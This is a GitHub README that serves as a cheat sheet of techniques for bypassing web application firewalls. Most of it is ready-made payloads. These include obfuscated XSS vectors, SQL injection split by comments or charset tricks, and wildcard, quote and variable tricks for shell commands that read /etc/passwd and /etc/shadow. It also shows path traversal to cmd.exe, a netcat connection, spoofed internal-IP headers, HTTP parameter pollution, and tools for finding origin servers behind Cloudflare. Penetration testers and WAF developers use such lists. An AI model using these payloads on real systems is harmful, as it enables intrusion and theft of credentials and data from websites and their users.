<h1 align="center">
  <br>
  <a href=""><img src="/img/logo.png" alt="" width="300px;"></a>
  <br>
  <img src="https://img.shields.io/badge/PRs-welcome-blue">
  <img src="https://img.shields.io/github/last-commit/kh4sh3i/WAF-Bypass">
  <img src="https://img.shields.io/github/commit-activity/m/kh4sh3i/WAF-Bypass">
  <a href="https://twitter.com/intent/follow?screen_name=kh4sh3i_"><img src="https://img.shields.io/twitter/follow/kh4sh3i_?style=flat&logo=twitter"></a>
  <a href="https://github.com/kh4sh3i"><img src="https://img.shields.io/github/stars/kh4sh3i?style=flat&logo=github"></a>
</h1>


# Bypassing WAFs
🔥 Web application firewalls (WAFs) bypass


### 1.Regex Bypasses
Different techniques can be used to bypass the regex filters on the firewalls. Examples include alternating case, adding line breaks, and encoding payloads. Resources for the various bypasses can be found at PayloadsAllTheThings and OWASP.

```
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
```


## 2.Obfuscation
While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.



```
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```



```
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```


## 3.Charset Encoding
This technique involves modifying the Content-Type header to use a different charset (e.g. ibm037). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python


```
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```



## 4.Unicode Compatability
Depending on the implementation of Unicode normalization, characters that share Unicode compatability may be able to bypass the WAF and execute as the intended payload.

```
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```



# Now I will explain more

## 1. Case Toggling Technique
Combine upper and lower case characters for creating efficient payloads.
```
<script>confirm()</script>

Bypassed Technique:

<ScrIpT>confirm()</sCRiPt>
```

## 2. URL Encoding Technique
* Encode normal payloads with % encoding/URL encoding.
* You can use Burp. It has an encoder/decoder tool.

```
<Svg/x=">"/OnLoAD=confirm()//

Bypassed Technique:

%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F
```

## 3. Unicode Technique
* ASCII characters in Unicode encoding give us great variants for bypassing WAF.
* Encode entire or part of the payload for obtaining results.


```
<marquee onstart=prompt()>

Obfuscated:

<marquee onstart=\u0070r\u06f\u006dpt()>
```

```
/?redir=http://google.com

Bypassed Technique:

/?redir=http://google。com (Unicode alternative)
```


```
<marquee loop=1 onfinish=alert()>x

Bypassed technique:

＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative)
```

```
../../etc/shadow

Obfuscated:

%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow
```


## 4. HTML Representation Technique
* WebApps encode special characters into HTML. Encoding and render them accordingly.
* Basic bypass cases with HTML encoding numeric and generic.

```
"><img src=x onerror=confirm()>

Encoded Payload:

&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;

Encoded Payload:

&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;
```

## 5. Mixed Encoding Technique
* Such rules often tend to filter out a specific type of encoding.
* Such filters can be bypassed by mixed encoding payloads.
* Newlines and tabs and further add to obfuscation.

```
Obfuscate Payload:

<A HREF="h
tt p://6 6.000146.0x7.147/">XSS</A>
```


## 6. Using Comments Technique
* Comments obfuscate standard payload vectors.
* Different payloads have different ways of obfuscation.

```
<script>confirm()</script>

Bypassed Technique:

<!--><script>confirm/**/()/**/</script>
```

```
/?id=1+union+select+1,2--

Bypassed Technique:

/?id=1+un/**/ion+sel/**/ect+1,2--
```


##  7. Double Encoding Technique
* Web Application Firewall filters tend to encode characters to protect web app.
* Poorly developed filters (without recursion filters) can be bypassed with double encoding.

```
<script>confirm()</script>

Obfuscate Payload:

%253Cscript%253Econfirm()%253C%252Fscript%253E
```

```
http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

Obfuscate Payload:

http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\
```


## 8. Wildcard Obfuscation Technique
* Global patterns are used by various command-line utilities to work with multiple files.
* We can change them to run system commands.

```
/bin/cat /etc/passwd

Obfuscate Payload:

/???/??t /???/??ss??
```

```
/bin/nc 127.0.0.1 443

Obfuscate Payload:

/???/n? 2130706433 443
```


## 9. Dynamic Payload Generation Technique:
* Programming languages have different patterns and syntaxes for concatenation.
* This allows us to generate payloads that can bypass many filters and rules.

```
<script>confirm()</script>

Obfuscate Payload:

<script>eval('con'+'fi'+'rm()')</script>
```

```
/bin/cat /etc/shadow

Obfuscate Payload:

/bi'n'''/c''at' /e'tc'/sh''ad'ow
```


```
<iframe/onload='this["src"]="javascript:confirm()"';>

Obfuscate Payload

<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>
```


## 10. Junk Characters Technique
* Simple payloads get filtered out easily by WAF.
* Adding some junk chars helps avoid detection (only specific cases ).
* This technique often helps in confusing regex-based firewalls.


```
<script>confirm()</script>

Obfuscate Payload:

<script>+-+-1-+-+confirm()</script>
```


```
<a href=javascript;alert()>ClickMe

Bypassed Technique:

<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
```


## 11. Line Breaks Technique
* A lot of WAFs with regex-based filtering effectively blocks many attempts.
* Line breaks technique (CR and LF) can break firewall regex and bypass stuff.

```
<iframe src=javascript:confirm(hacker)">

Obfuscate Payload:

<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">
```

## 12. Uninitialized Variables Technique
* Wrong regular expression based filters can be evaded with uninitialized bash variables.
* Such value equal to null and acts like empty strings.
* Bash and perl allow such kind of interpretations.


* First Level Obfuscation: Normal
```
/bin/cat /etc/shadow
Obfuscate Payload:
/bin/cat$u /etc/shadow$u
```

* Second Level Obfuscation: Position Based
```
/bin/cat /etc/shadow
Obfuscate Payload:
$u/bin$u/cat$u $u/etc$u/shadow$u
```

* Third Level Obfuscation: Random characters
```
/bin/cat /etc/passwd
Obfuscate Payload:
$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
```


## 13. Tabs and Line Feeds Technique
* Tabs often help to evade firewalls, especially regex-based.
* Tabs can help break WAF regex when the regex is expecting whitespaces and not tabs.

```
<IMG SRC="javascript:confirm();">

Bypassed Technique:

<IMG SRC=" javascript:confirm();">
<IMG SRC=" jav ascri pt:confirm ();">
```

```
<iframe src=javascript:confirm()></iframe>

Obfuscate Payload:

<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>
```

## 14. Obfuscation in Other Formats Technique
* Many web applications support different encoding types and can interpret the encoding.
* We always need to obfuscate the payload to a format not supported by WAF, but the server can smuggle our payload.
* IIS 6, 7.5, 8, and 10 allow IBM037 character interpretations.
* Send the encoded parameters with the query.


```
POST /example.aspx?id7=sometext HTTP/1.1
HOST: target.org
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 27
id2='union all select * from users--

Obfuscated Request with URL Encoding:

POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1
HOST: target.org
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Length: 127
%89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60
```


## 15. Content Size
In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.



## 16. Request Header Spoofing:
* The target is to fool the WAF/server into believing it was from their internal network.
* Adding some spoofed headers to represent the internal network, does the trick.

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

## 17. Null Bytes:
* The null bytes are commonly used as string terminator.
* This can help us evade many web application filters in case they are not filtering out the null bytes.

```
<scri%00pt>alert(1);</scri%00pt>
<scri\x00pt>alert(1);</scri%00pt>
<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
```

## 18. HTTP Parameter Pollution
* This attack method is based on how a server interprets parameters with the same names.
* Possible bypass chances here are:
    * The server uses the last received parameter, and WAF checks only the first.
    * The server unites the value from similar parameters, and WAF checks them separately.


```
http://example.com/home?redirectURL=internalPage

malicious code

http://example.com/home?redirectURL=internalPage&redirectURL=http://malicious.com
```

```
POST /payslip HTTP/1.1
Host: vulnerable.dev

{
    "month" : "March",
    "year" : "2010"
}

malicious code

POST /payslip HTTP/1.1
Host: vulnerable.dev

{
    "month" : "March",
    "year" : "2010",
    "month" : "April' and 1=1 -- a"
}
```






## Tools
* [w3af](https://github.com/andresriancho/w3af) — Web Application Attack and Audit Framework
* [wafw00f](https://github.com/EnableSecurity/wafw00f) — Identify and fingerprint Web Application Firewall
* [BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) – Bypass firewalls by abusing DNS history. This tool will search for old DNS A records and check if the server replies for that domain.
* [CloudFail](https://github.com/m0rtem/CloudFail) – is a tactical reconnaissance tool that tries to find the original IP address behind the Cloudflare WAF.



### references
* [hacken](https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/)
* [owasp waf bypass](https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_-_Web_Application_Firewall_Bypassing_-_how_to_defeat_the_blue_team_-_2015.10.29.pdf)